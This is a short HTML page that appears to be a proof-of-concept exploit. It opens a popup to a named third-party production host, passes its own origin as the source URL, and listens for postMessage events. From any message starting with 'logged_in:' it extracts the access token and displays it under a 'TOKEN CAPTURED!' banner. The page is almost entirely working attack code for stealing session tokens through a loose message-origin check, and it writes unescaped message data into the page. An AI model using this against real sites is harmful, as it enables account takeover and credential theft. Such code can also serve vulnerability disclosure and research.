<!DOCTYPE html>
<html>
<body>
<script>
window.addEventListener("message", function(e) {
    console.log("Origin:", e.origin);
    console.log("Data:", e.data);
    
    var output = document.getElementById("output");
    if (output) {
        output.innerHTML += "<p><strong>Origin:</strong> " + e.origin + "</p>" +
                           "<p><strong>Data:</strong> " + e.data + "</p><hr>";
    }
    
    if (e.data?.startsWith("logged_in:")) {
        const token = e.data.split("access_token=")[1]?.split("&")[0];
        console.log("🎯 ACCESS_TOKEN:", token);
        
        if (output) {
            output.innerHTML = "<h2 style='color:red'>🎯 TOKEN CAPTURED!</h2>" +
                "<p><strong>Access Token:</strong> " + token + "</p>" +
                "<p><strong>Full Data:</strong></p><pre>" + e.data + "</pre>";
        }
    }
}, false);

var url = "https://cloudloader.default.prod.walmart.dice.livelinklabs.com/picasa?" +
    "source_url=" + encodeURIComponent(location.origin) + 
    "&live_update=true";
window.open(url, "popup", "width=800,height=600");
</script>

<div id="output">
    <p>Waiting for postMessage...</p>
</div>
</body>
</html>
